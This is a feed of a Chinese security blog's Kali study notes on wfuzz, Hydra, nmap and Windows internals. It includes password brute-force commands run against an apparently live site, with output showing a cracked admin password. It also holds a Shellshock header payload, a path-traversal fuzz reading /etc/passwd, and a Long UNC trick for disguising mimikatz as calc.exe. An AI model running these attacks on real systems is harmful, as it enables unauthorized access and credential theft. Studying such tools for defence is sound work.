    <category term="kali" scheme="https://www.dansemal.cn/tags/kali/"/>
    
  </entry>
  
  <entry>
    <title>116-wfuzz</title>
    <link href="https://www.dansemal.cn/posts/842022b9/"/>
    <id>https://www.dansemal.cn/posts/842022b9/</id>
    <published>2021-04-03T07:21:00.000Z</published>
    <updated>2021-06-05T06:19:20.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="wfuzz">wfuzz</h2><ul><li><p>Python语言编写的Fuzzer</p><ul><li>功能多、速度快、灵活性高、可扩展</li><li>从所有入口向服务器提交数据( IP、域名、端口、方法、变量、头部…)</li><li>使用占位符标识注入点( FUZZ )</li><li>指定Payload进行替换提交数据</li></ul></li><li><p>Payload模块(encoders/iterators/scripts/printers)</p><ul><li><p>wfuzz -e payloads</p></li><li><p>wfuzz -z help --slice file                  payload详细信息</p></li><li><p>wfuzz -z range,1-254 -z file,a.txt --hc 404 <a href="http://1.1.1.FUZZ/FUZ2Z">http://1.1.1.FUZZ/FUZ2Z</a></p></li><li><p>-Z --conn-delay 3 --req-delay 3</p></li><li><p>wfuzz -z range,1-254 -z file,a.txt --hh BBB <a href="http://1.1.1.FUZZ">http://1.1.1.FUZZ</a>{b}/FUZ2Z{a}</p></li><li><pre><code class="language-sh">      /usr/share/wordlists                            23s   root@kali  0.07   14:40:25    ❯ wfuzz -c -v -w ./SecLists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt -d &quot;user=admin&amp;pw=FUZZ&#123;a&#125;&quot; --hh BBB -u &quot;http://www.c1moon.com/admin/index.php?action=login&quot;   /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.  ********************************************************  * Wfuzz 3.1.0 - The Web Fuzzer                         *  ********************************************************    Target: http://www.c1moon.com/admin/index.php?action=login  Total requests: 10000    ====================================================================================================================================================  ID           C.Time       Response   Lines      Word     Chars       Server                           Redirect                         Payload  ====================================================================================================================================================    000000001:   1.039s       200        33 L       100 W    1549 Ch     Microsoft-IIS/8.5                                                 &quot;a&quot;  000000002:   1.063s       302        1 L        3 W      87 Ch       Microsoft-IIS/8.5                ./                               &quot;123456&quot;  ^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...    Total time: 0  Processed Requests: 141  Filtered Requests: 139  Requests/sec.: 0</code></pre></li><li><p>wfuzz -H “User- Agent: () { :;}; echo; echo XXX” --ss XXX -w cgi.txt <a href="http://a/FUZZ">http://a/FUZZ</a></p></li></ul></li><li><p>结果过滤</p><ul><li>–hc / SC          #响应码</li><li>–hl / sl             #响应Body行数</li><li>–hw / SW        #响应Body word数量</li><li>–hh / sh          #响应Body chars数量</li><li>–hs / SS         #响应Body正则匹配</li></ul></li><li><p>–filter</p><ul><li><code>wfuzz -c -v -z list,a-b-admin -z list,1-2-password -d &quot;username=FUZZ&amp;password=FUZ2Z&amp;Login=Login&quot; --filter &quot;headers.response.Location='~index.php'&quot; http://url/dvwa/login.php</code></li><li><a href="http://wfuzz.readthedocs.io/en/latest/">http://wfuzz.readthedocs.io/en/latest/</a></li></ul></li></ul><p>URL参数</p><p>wfuzz -C -V -w /usr/share/wfuzz/wordlist/Injections/Traversal.txt -b<br>“security= low; PHPSESSID= 898d5fb4a2b85261f1dff1fca1d9b30c” --ss<br>‘root;x’ -u <a href="http://ip/dvwa/vulnerabilities/fi/?page=FUZZ">http://ip/dvwa/vulnerabilities/fi/?page=FUZZ</a></p><p>测试Cookie<br>wfuzz -z file,a.txt -b cookie =FUZZ - <a href="http://ip/">http://ip/</a></p><p>测试Head<br>wfuzz -z file,a.txt -H “User-Agent: IE99” <a href="http://ip/FUZZ">http://ip/FUZZ</a></p><p>请求方法<br>wfuzz -z list,GET-HEAD-POST-TRACE-OPTIONS-DELETE-MOVE -X FUZZ ip</p><p>使用代理<br>wfuzz -Z file,a.txt -p ip:8080 <a href="http://ip/FUZZ">http://ip/FUZZ</a></p><p>HTTP身份认证<br>wfuzz -Z list,user-pass --basic FUZZ:FUZ2Z <a href="http://ip/">http://ip/</a></p><p>递归深度<br>wfuzz -z file,a.txt -R 3 <a href="http://ip/FUZZ">http://ip/FUZZ</a></p><p>速度控制<br>-t             #线程(并发数)<br>-S            #请求间隔</p><p>输出格式<br>wfuzz -f outfile,json -w a.txt <a href="http://ip/FUZZ">http://ip/FUZZ</a></p><p>全局配置~/.wfuzz/wfuzz.ini<br>cancle_on_plugin_except= 1                    #插件异常退出<br>concurrent plugins = 3                                 #并发插件上限<br>lookup_dirs= .                                             #字典文件目录<br>encode_space = 1                                      #编码空格键</p><p>Iterators模块<br>wfuzz -e iterators<br>zip :字典配对    /    chain :多字典单变量      / product :默认交叉<br>wfuzz -z list,a-b-c -z list,1-2-3 -m zip <a href="http://ip/FUZZ/FUZ2Z">http://ip/FUZZ/FUZ2Z</a></p><p>Encoders模块<br>●wfuzz -z file,a.txt,md5 <a href="http://ip/FUZZ">http://ip/FUZZ</a></p><p>Script模块<br>wfuzz --script= robots -z list,robots.txt <a href="http://ip/FUZZ">http://ip/FUZZ</a></p><p>保存调用<br>wfuzz --script=robots -z list,a.txt --dump-recipe job1 <a href="http://ip/FUZZ">http://ip/FUZZ</a><br>wfuzz --recipe job1</p><p>预过滤Payload<br>wfuzz -z list,1-2-1-2-a --slice “FUZZ|u0” <a href="http://1.1.1.1/FUZZ">http://1.1.1.1/FUZZ</a></p><p>wfuzz库<br>import wfuzz<br>a = wfuzz.fuzz(url= “<a href="http://ip/FUZZ">http://ip/FUZZ</a>”, hc=[404] payloads=[( file ,dict(fn=&quot;a.txt ))<br>for r in a:<br>print r</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;wfuzz&quot;&gt;wfuzz&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Python语言编写的Fuzzer&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;功能多、速度快、灵活性高、可扩展&lt;/li&gt;
&lt;li&gt;从所有入口向服务器提交数据( IP、域名、端口、方法、变量、头部…)&lt;/li&gt;
&lt;li&gt;</summary>
      
    
    
    
    <category term="kali_tools" scheme="https://www.dansemal.cn/categories/kali-tools/"/>
    
    
    <category term="kali_tools" scheme="https://www.dansemal.cn/tags/kali-tools/"/>
    
    <category term="wfuzz" scheme="https://www.dansemal.cn/tags/wfuzz/"/>
    
  </entry>
  
  <entry>
    <title>136-暴力破解hydra</title>
    <link href="https://www.dansemal.cn/posts/5df38cfb/"/>
    <id>https://www.dansemal.cn/posts/5df38cfb/</id>
    <published>2021-04-03T07:21:00.000Z</published>
    <updated>2021-06-05T06:19:20.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Hydra">Hydra</h2><ul><li>在线密码破解工具</li><li>支持多种协议(身份认证)<ul><li>每种协议有不同的身份认证数据提交格式</li><li>根据提交数据的返回信息判断认证是成功与否</li><li>adam6500 asterisk cisco cisco-enable cobaltstrike cvs firebird ftp[s] http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp</li><li><code>hydra -l [user] -p [pass] [service://server[:PORT][/OPT]]</code><br><code>hydra -l user -p password ftp://1.1.1.1:2121</code><br><code>hydra -L user.txt -P pass.txt smb://1.1.1.0/24</code><br><code>hydra -l user -P pass.txt -M targets.txt ssh</code><br><code>hydra -C cred.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5</code><ul><li><code>-C : login:pass</code></li><li><code>hydra -U pop3s</code>           #查询模块可用选项</li><li>-R                                     继续之前未完成的破解任务( hydra.restore )</li><li>-I                                       重新开始扫描(忽略hydra.restqre )</li><li>-S                                      执行SSL连接( -0使用过时的SSLv2 /v3 )</li><li>-X MIN:MAX:CHARSET ( 小写a/大写A/数字1 )<ul><li>-X 3:5:aA1        -X 5:5:/%,</li></ul></li><li>-e nsr                                  n空密码/ S用户名作密码/ r翻转的用户名做密码</li><li>-U                                        循环用户( 默认循环密码)</li><li>-o                                         结果输出到文件</li><li>-f/-F                                     成功退出(-f per host,   -F global)</li><li>-t / -T                                  每主机并发连接数/全局并发连接数</li><li>-c                                        登录请求延时</li><li>-4/-6                                    IPv4 /v6</li><li>-v/-V                                    详细信息/每次登陆</li></ul></li><li>基于表单的web应用程序密码破解</li><li>hydra -1 admin -P pass.txt 192.168. 20.10 http-post-form &quot;dwwa/login.php:username= ^USER^&amp;password= ^PASS ^&amp;Login=Login:S=index.php -t 1 -vV</li><li>F=login.php            #S成功     F失败</li><li>C= /page/cookie:H=‘UA:firefox’    #指定cookie获取页面和http头</li><li>https-post form. http- get-form. https- get-form</li><li>hydra -U http-post form                 查看模块参数</li></ul></li></ul><p>例子:表单爆破</p><p><code>hydra -l admin -P ./SecLists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt -f www.c1moon.com http-post-form &quot;/admin/index.php:user=^USER^&amp;pw=^pw^:F=/index.php?action=login&quot; -vV</code></p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1d5bdcc3dad44460a533711981d92d59-10871b.webp" alt="image-20221110154241916"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">    /usr/share/wordlists                                       14m 26s   root@kali  0.03   15:40:29  </span><br><span class="line">❯ hydra -l admin -P ./SecLists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt -f www.c1moon.com http-post-form &quot;/admin/index.php:user=^USER^&amp;pw=^pw^:F=/index.php?action=login&quot; -vV</span><br><span class="line">Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-10 15:40:37</span><br><span class="line">[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 10000 login tries (l:1/p:10000), ~625 tries per task</span><br><span class="line">[DATA] attacking http-post-form://www.c1moon.com:80/admin/index.php:user=^USER^&amp;pw=^pw^:F=/index.php?action=login</span><br><span class="line">[VERBOSE] Resolving addresses ... [VERBOSE] resolving done</span><br><span class="line">[ATTEMPT] target www.c1moon.com - login &quot;admin&quot; - pass &quot;123456&quot; - 1 of 10000 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target www.c1moon.com - login &quot;admin&quot; - pass &quot;password&quot; - 2 of 10000 [child 1] (0/0)</span><br><span class="line">[ATTEMPT] target www.c1moon.com - login &quot;admin&quot; - pass &quot;12345678&quot; - 3 of 10000 [child 2] (0/0)</span><br><span class="line">[ATTEMPT] target www.c1moon.com - login &quot;admin&quot; - pass &quot;qwerty&quot; - 4 of 10000 [child 3] (0/0)</span><br><span class="line">[ATTEMPT] target www.c1moon.com - login &quot;admin&quot; - pass &quot;123456789&quot; - 5 of 10000 [child 4] (0/0)</span><br><span class="line">[ATTEMPT] target www.c1moon.com - login &quot;admin&quot; - pass &quot;12345&quot; - 6 of 10000 [child 5] (0/0)</span><br><span class="line">[ATTEMPT] target www.c1moon.com - login &quot;admin&quot; - pass &quot;1234&quot; - 7 of 10000 [child 6] (0/0)</span><br><span class="line">[ATTEMPT] target www.c1moon.com - login &quot;admin&quot; - pass &quot;111111&quot; - 8 of 10000 [child 7] (0/0)</span><br><span class="line">[ATTEMPT] target www.c1moon.com - login &quot;admin&quot; - pass &quot;1234567&quot; - 9 of 10000 [child 8] (0/0)</span><br><span class="line">[ATTEMPT] target www.c1moon.com - login &quot;admin&quot; - pass &quot;dragon&quot; - 10 of 10000 [child 9] (0/0)</span><br><span class="line">[ATTEMPT] target www.c1moon.com - login &quot;admin&quot; - pass &quot;123123&quot; - 11 of 10000 [child 10] (0/0)</span><br><span class="line">[ATTEMPT] target www.c1moon.com - login &quot;admin&quot; - pass &quot;baseball&quot; - 12 of 10000 [child 11] (0/0)</span><br><span class="line">[ATTEMPT] target www.c1moon.com - login &quot;admin&quot; - pass &quot;abc123&quot; - 13 of 10000 [child 12] (0/0)</span><br><span class="line">[ATTEMPT] target www.c1moon.com - login &quot;admin&quot; - pass &quot;football&quot; - 14 of 10000 [child 13] (0/0)</span><br><span class="line">[ATTEMPT] target www.c1moon.com - login &quot;admin&quot; - pass &quot;monkey&quot; - 15 of 10000 [child 14] (0/0)</span><br><span class="line">[ATTEMPT] target www.c1moon.com - login &quot;admin&quot; - pass &quot;letmein&quot; - 16 of 10000 [child 15] (0/0)</span><br><span class="line">[80][http-post-form] host: www.c1moon.com   login: admin   password: 123456</span><br><span class="line">[STATUS] attack finished for www.c1moon.com (valid pair found)</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Hydra&quot;&gt;Hydra&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;在线密码破解工具&lt;/li&gt;
&lt;li&gt;支持多种协议(身份认证)
&lt;ul&gt;
&lt;li&gt;每种协议有不同的身份认证数据提交格式&lt;/li&gt;
&lt;li&gt;根据提交数据的返回信息判断认证是成功与否&lt;/li&gt;
&lt;li&gt;adam650</summary>
      
    
    
    
    <category term="kali_tools" scheme="https://www.dansemal.cn/categories/kali-tools/"/>
    
    
    <category term="kali_tools" scheme="https://www.dansemal.cn/tags/kali-tools/"/>
    
    <category term="hydra" scheme="https://www.dansemal.cn/tags/hydra/"/>
    
  </entry>
  
  <entry>
    <title>41-网络扫描nmap</title>
    <link href="https://www.dansemal.cn/posts/312a7540/"/>
    <id>https://www.dansemal.cn/posts/312a7540/</id>
    <published>2021-04-03T07:21:00.000Z</published>
    <updated>2021-06-05T06:19:20.000Z</updated>
    
    <content type="html"><![CDATA[<p>默认情况namp只发一次syn包,1000个常用端口</p><ul><li>–top-ports 500</li><li>不显示closed端口(open filter)</li><li>dns反向域名查询</li><li>-e :指定网卡</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;默认情况namp只发一次syn包,1000个常用端口&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;–top-ports 500&lt;/li&gt;
&lt;li&gt;不显示closed端口(open filter)&lt;/li&gt;
&lt;li&gt;dns反向域名查询&lt;/li&gt;
&lt;li&gt;-e :指定网卡&lt;/li&gt;
&lt;/ul&gt;
</summary>
      
    
    
    
    <category term="kali_tools" scheme="https://www.dansemal.cn/categories/kali-tools/"/>
    
    
    <category term="kali_tools" scheme="https://www.dansemal.cn/tags/kali-tools/"/>
    
    <category term="nmap" scheme="https://www.dansemal.cn/tags/nmap/"/>
    
  </entry>
  
  <entry>
    <title>KALI信息搜集</title>
    <link href="https://www.dansemal.cn/posts/cabed9ff/"/>
    <id>https://www.dansemal.cn/posts/cabed9ff/</id>
    <published>2021-04-03T07:21:00.000Z</published>
    <updated>2021-06-05T06:19:20.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="路径枚举">路径枚举</h2><ul><li>渗透测试<mark class="hl-label pink">初期</mark> 信息搜集阶段</li><li>通常用法<ul><li>traceroute<ul><li>基于icmp协议</li><li>ip头部ttl值递增,根据返回地址判断路径</li></ul></li><li>弊端<ul><li>路径设备禁用icmp数据包探测无效</li></ul></li></ul></li></ul><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210807200958.png" alt="image-20210807200952222"></p><p>每个ttl值 发送三个数据包</p><p>当ttl值为0   返回icmp数据包</p><ul><li>基于tcp协议的路径追踪<ul><li>traceroute -T ip</li><li>tcptraceroute ip #shell脚本</li></ul></li><li>技术原理<ul><li>发送ttl值递增的syn包</li></ul></li><li>弊端<ul><li>不建立完整的tcp握手,会被默写nat设备丢弃包</li></ul></li></ul><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210807201633.png" alt="image-20210807201625321"></p><ul><li><p>基于正常会话的tcp协议路径追踪</p><ul><li>0trace iface ip port</li></ul></li><li><p>技术原理</p><ul><li>基于正常tcp会话发送ack包</li><li>ip头部ttl递增</li></ul></li><li><p>优势</p><ul><li>可能探测到内网地址段</li><li>绕过某些防火墙</li></ul></li><li><p>以下情况无效</p><ul><li>目标防火墙丢弃所有出站icmp数据包</li><li>目标防火墙作ttl值重写或全包重写</li><li>路径中存在应用层代理/负载均衡设备</li><li>防火墙后没有明确的三层设备</li><li>idp/ips容易检测到tcp特征</li></ul></li></ul><h2 id="acccheck">acccheck</h2><ul><li>密码破解工具</li><li>smb协议分析工具<ul><li>tcp445端口</li><li>ms08-067</li><li>wannacry</li></ul></li></ul><p>原理</p><ul><li><p>尝试连接目标默认共享</p><ul><li><p>ipc$</p></li><li><p>ADMIN$</p></li></ul></li><li><p>命令参数</p><ul><li>t/T</li><li>u/U</li><li>p/P</li><li>-v</li></ul></li></ul><p>大写接文件</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;路径枚举&quot;&gt;路径枚举&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;渗透测试&lt;mark class=&quot;hl-label pink&quot;&gt;初期&lt;/mark&gt; 信息搜集阶段&lt;/li&gt;
&lt;li&gt;通常用法
&lt;ul&gt;
&lt;li&gt;traceroute
&lt;ul&gt;
&lt;li&gt;基于icmp协议&lt;/li&gt;
&lt;</summary>
      
    
    
    
    <category term="kali" scheme="https://www.dansemal.cn/categories/kali/"/>
    
    
    <category term="kali" scheme="https://www.dansemal.cn/tags/kali/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透</title>
    <link href="https://www.dansemal.cn/posts/4e0a5250/"/>
    <id>https://www.dansemal.cn/posts/4e0a5250/</id>
    <published>2021-03-25T11:35:43.000Z</published>
    <updated>2022-01-09T07:34:49.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="windows-特性">windows 特性</h2><h3 id="工作组">工作组</h3><p>工作组是指数台计算机在同一个内网中，在逻辑上都属于工作组，但是在工作组中的机器之间相互没有信任关<br>系，每台机器的账号密码只是保存在自己的SAM文件中。那就意味着如果需要共享资源只能新建-个账号并<br>指定相关资源授予该账号权限才可以完成共享。使得访问资源更有层次化，缺乏管理域控制机制。</p><h3 id="Windows用户、组">Windows用户、组</h3><p>●不同的用户身份拥有不同的权限<br>●每个用户包含-一个名称和一个密码<br>●用户帐户拥有唯一 的安全标识符(Security Identifier， SID)</p><h3 id="Windows默认账户">Windows默认账户</h3><p>●用于特殊用途，- -般不需更修改其权限<br>●与使用者关联的用户帐户Administrator (管理员用户)<br>●默认的管理员用户,Guest (来宾用户) 默认是禁用的</p><h3 id="Windows内置用户账户">Windows内置用户账户</h3><p>●权限: Guest&gt; User&gt; Administrator&gt; SYSTEM&gt; TrustedInstall<br>●Local System(NT AUTHORITY\System):为windows的核心组件访问文件等资源提供权限</p><ol><li>It has the highest level of permissions on the local system.</li><li>If the client and the server are both in a domain, then the Local System account uses the PC account<br>(hostname$) to login on the remote computer.</li><li>If the client or the server is not in a domain, then the Local System account uses ANONYMOUS LOGON.<br>●Local Service(NT AUTHORITY\Local Service): 预设的拥有最小权限的本地账户</li><li>It has permissions as an unpriviledge normal user on the local system.</li><li>It always uses ANONYMOUS LOGON, whether a computer is in a domain or not.<br>●Network Service(NT AUTHORITY\Network Service): 具有运行网络服务权限的计算机账户</li><li>It has permissions as an unpriviledge normal user on the local system.</li><li>When accessing the network, it behaves the same as the Local System account. .<br>●TrustedInstaller<br>C:\Windows\servicing</li></ol><h3 id="Windows用户属性">Windows用户属性</h3><p>●displayname<br>●objectsid<br>●userprincipalname<br>●samaccountname<br>●whencreateds<br>●owdlastset<br>●lastlogon</p><h3 id="Windows内置组">Windows内置组</h3><p>●Administrators<br>●Guests<br>●Power Users<br>●Users (标准用户)<br>●Remote Desktop Users</p><h3 id="Windows组">Windows组</h3><p>●通讯组:不能控制对资源对访问，逻辑上将用户归纳，方便发件等<br>●安全组:权限的集合，对组配置权限便于管理<br>●全局组<br>●通用组<br>●域本地组</p><h3 id="Windows内置用户账户-2">Windows内置用户账户</h3><p>●administators 组内的用户，都具备系统管理员的权限，它们拥有对这台计算机最大的控制权限，可以执<br>行整台计算机的管理任务。内置的系统管理员账号Administrator就是本地组的成员，而且无法将它从该.<br>组删除。如果这台计算机已加入域，则域的Domain Admins会自动地加入到该计算机的Administrators<br>组内。也就是说，域上的系统管理员在这台计算机上也具备着系统管理员的权限。<br>Guests组是提供给没有用户帐户但是需要访问本地计算机内资源的用户使用，该组的成员无法永久地改变<br>其桌面的工作环境。该组最常见的默认成员为用户帐号Guest。<br>●Power Users组内的用户具备比Users组更多的权利，但是比Administrators组拥有的权利更少- -些，<br>例如，可以:创建、删除、更改本地用户帐户;创建、删除、管理本地计算机内的共享文件夹与共享打印<br>机;自定义系统设置，例如更改计算机时间、关闭计算机等。但是不可以更改Administrators,无法夺取<br>文件的所有权、无法备份与还原文件、无法安装删除与删除设备驱动程序、无法管理安全与审核日志。<br>●Users组内的成员只拥有一些基本的权利，例如运行应用程序，但是他们不能修改操作系统的设置、不能<br>更改其它用户的数据、不能关闭服务器级的计算机。所有添加的本地用户帐户者自动属于Users组。如果这<br>台计算机已经加入域，则域的DomainUsers会自动地被加入到该计算机的Users组中。<br>RemoteDesktopUsers组内的成员拥有远程桌面登录的权限。默认Administrators组内的成员都拥有<br>远程桌面的权限。</p><h3 id="UAC">UAC</h3><p>●用户帐户控制(User Account Control )<br>用户帐户控制(User Account Control, 简写作UAC)是微软公司在其Windows Vista及更高版本操作系<br>统中采用的一种控制机制。其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助阻<br>止恶意程序(有时也称为“恶意软件&quot; )损坏系统的效果。<br>1.组信息项中主要是Integrity levels (IL) [进程完整性级别不同]。标准用户是Medium Mandatory<br>Level，UAC用户是High Mandatory Level, 它包括∪ntrust，Low， Medium， Hight， System<br>等，级别越低，权限也就越低。我们可以通过GetTokenInformation的TokenIntegrityLevel来进行查<br>询<br>2.体现在Privilege中的就是UAC用户拥有很多Privilege,比如最常用的SeDebugPrivilege<br>●完整的Privilege列表</p><h3 id="已过滤的管理员令牌">已过滤的管理员令牌</h3><p>●UAC也使用受限制的令牌来创建已过滤的管理员令牌<br>●特征:<br>完整性级别被设置为中</p><h3 id="安全描述符-Security-descriptor">安全描述符( Security descriptor )</h3><p>安全描述符( Security descriptor )</p><p>●当一个对象被创建时，系统将为其分配安全描述符，安全描述符包含了该对象的属主对该对象所配置的一<br>些安全属性和策略<br>●安全描述符由4部分组成:<br>●SID(标识该对象拥有的SID)<br>●DACL(该对象的访问控制策略)<br>●SACL(该对象的访问行为的审计策略)<br>●Flag (其他标志位信息) ;</p><p>ACL<br>●ACL (访问控制列表) :是否可以访问?<br>●DACL:用来标志某个安全对象允许被哪些对象访问<br>1.无DACL授予该对象的所有访问权限给任何用户<br>2.有DACL、无ACE拒绝对该对象任意访问<br>●SACL:该对象上的存取方式(读、写、执行)列表<br>●ACE: ACL的每- -项.<br>1.谁对你有权限<br>2.允许/拒绝<br>3.有什么权限:读写执行、对属性读写执行、对特殊属性读写执行<br>4.是否可以被继承:下属组是否应用</p><p>Windows Token</p><p>windwos安全模型中，有两个角色，一个就是访问者(进程)，-个是被访问者(资源)<br>资源是- -个广义的概念，所谓的资源可以是文件，目录，注册表，管道，命名句柄，进程，线程<br>每个资源都有-一个安全描述符，安全描述符当中包含了ACL(访问控制列表)<br>访问控制列表中每条规则都对应记录着一个SID被允许和拒绝的操作(如读、写、执行)</p><p>Windows Access Token</p><p>Windows Access Token(访问令牌)，它是一个描述进程或者线程安全上下文的一个对象。不同的用户登录<br>计算机后，都会生成一 -个Access Token，这个Token在用户创建进程或者线程时会被使用，不断的拷贝,<br>这也就解释了A用户创建- - 个进程而该进程没有B用户的权限。当用户注销后，系统将会使主令牌切换为模拟<br>令牌，不会将令牌清除，只有在重启机器后才会清除<br>Access Token分为两种(主令牌、模拟令牌)<br>*主令牌(Primary token) :交互式会话登陆(例:本地用户登陆、用户桌面等)<br>To<br>*模拟令牌(Impersonation token) :非交互式登陆(例: net use访问共享文件)<br>●用户双击运行一个程序都会拷贝“explorer.exe&quot; 的Access Token。.<br>●用户注销后系统将会使主令牌切换为模拟令牌不会将令牌清除只有在重启机器后才会清除。</p><p>Windows Access Token组成<br>会话ld:用户帐户的安全标识符(SID)<br>用户所属的组的SID<br>用于标识当前登录会话的登录SID<br>特权列表:用户或用户组所拥有的权限列表<br>所有者SID<br>主要组的SID<br>访问控制列表<br>访问令牌的来源<br>令牌是主要令牌还是模拟令牌<br>限制SID的可选列表<br>目前的模拟等级<br>其他统计数据</p><p>UNC ( Universal Naming Convention )<br>●通用命名规则，可用来表示Windows系统中文件的位置<br>●一个路径，指定在一个独特的位置的文件系统<br>●常见的定界字符是斜杠(“1”)，反斜杠字符(“\”)或冒号(“:”)<br>●资源可以用绝对路径或相对路径表示</p><p>Long UNC<br>●正常UNC支持的最大长度为260字符<br>●为了支持更长的字符，引入了Long UNC，支持最大长度为32767<br>●特殊Long UNC的文件能够欺骗系统，将其识别为另一个文件(同名多文件)<br>●Example: \?\C:\test\a.exe<br>如果在Long UNC文件名后面加- -个空格，系统对文件名的判断将发生错误<br>type putty.exe &gt; &quot;\?\C:\test\mimikatz.exe ”</p><p>Long UNC伪造签名<br>●文件伪造，<br>type putty.exe &gt; &quot;\?\C:\Windows\System32\calc.exe &quot;<br>●获取短文件名<br>dir /x calc*.exe<br>●执行<br>1.wmic<br>wmic process call create C:\Windows\System32\CALC-1.exe<br>2.vbs<br>Set objShell = CreateObject(“Wscript. Shell’”)<br>objShell.Run &quot;c:\windows\system32\calc- 1.exe &quot;<br>3.js<br>var wsh=new ActiveXObject(“wscript. shell”);<br>wsh.run(“c:llwindowsllsystem32\calc-1.exe”);<br>●删除<br>del &quot;I?\C:\Windows\System32\calc.exe</p><p>SID<br>DeadEye<br>安全标识符是一一个唯一的字符串，它可以代表一个账户、一个用户组。用于标识该用户账号以及其所属的用户<br>组。系统在用户请求访问某些对象时，通过提供的访问令牌来确认是否具有对应的访问权限。<br>●通常它还有一个SID固定列表，SID表现形式:<br>域SID-用户ID<br>计算机SID-用户ID</p><p>常见SID<br>●500 ( Administrator )<br>●501 ( Guest)<br>●502 ( Krbtgt)<br>●512 (Domain Admins)<br>●513 ( Domain Users )<br>●515 (Domain Computers)<br>●516 (Domain Controllers)<br>●519 (Enterprise Admins )</p><p>SAM<br>DeadEye<br>SAM(安全账户管理器)，SAM是用来存储Windows操作系统密码的数据库文件，为了避免明文密码泄漏，<br>SAM文件中保存的是明文密码经过-系列算法处理过的Hash值，被保存的Hash分为LMHash.<br>NTLMHash。在用户在本地或远程登陆系统时，会将Hash值与SAM文件中保存的Hash值进行对比。在后<br>期的Windows系统中，SAM文件中被保存的密码Hash都被密钥SYSKEY加密。<br>SAM文件在磁盘中的位置在C:\windows\system32\config\sam<br>SAM文件在Windows系统启动后被系统锁定，无法进行移动和复制</p><p>SAM-注册表<br>●HKLM\SAM: 包含用户密码的NTLMv2哈希值<br>●HKLM\Security:包含缓存的域记录LSA secrets/LSA密钥<br>●HKLM\SYSTEM:包含可用于加密LSA secret和加密SAM数据库的密钥(syskey)<br>●Syskey: 用来解密SAM获取Hash<br>●Syskey组成:<br>HKEY_ LOCAL_ MACHINE\SYSTEM\CurrentControlSetIControlLsa键值<br>JD、Skew1、GBG和Data中的内容，拼接成syskey</p><p>LM Hash漏洞<br>1.不区分大小写，原因见LM Hash生成方法<br>2.密码最长为14位<br>3.判断位数(第2组为aad3b435b51404ee，密码肯定少于7位)<br>4.DES加密强度较弱<br>5.如果14位密码，可被分开破解</p><p>Mscache Hash<br>DeadEye<br>mscache hash是域用户在登录域内机器时，所留下的域缓存凭据<br>●MSCACHE或者叫domain cached credentials. DCC、域缓存凭据<br>dcc1 hash与dcc2 hash<br>●AES-CTS加密<br>默认是保存10个凭据<br>●在机器连不上域控的时候也可以使用Mscache Hash登陆机器(交互式登陆，XP 's RDP Client)</p><p>域<br>●域:有安全边界的集合，同一域中计算机相互信任，计算机之间允许相互访问<br>●根域:网络中第-一个域，一个域林只有一个根域<br>●域树:由多个域组合，形成连续的名字空间。一个.代表一个层次，层次越深级别越低<br>如: <a href="http://dm.org">dm.org</a>、<a href="http://mail.dm.org">mail.dm.org</a>. <a href="http://test.mai.dm.org">test.mai.dm.org</a><br>●域林:–个域林可以有多个域树<br>如:<br>dm.org根域<br>zhuren.org域树</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;windows-特性&quot;&gt;windows 特性&lt;/h2&gt;
&lt;h3 id=&quot;工作组&quot;&gt;工作组&lt;/h3&gt;
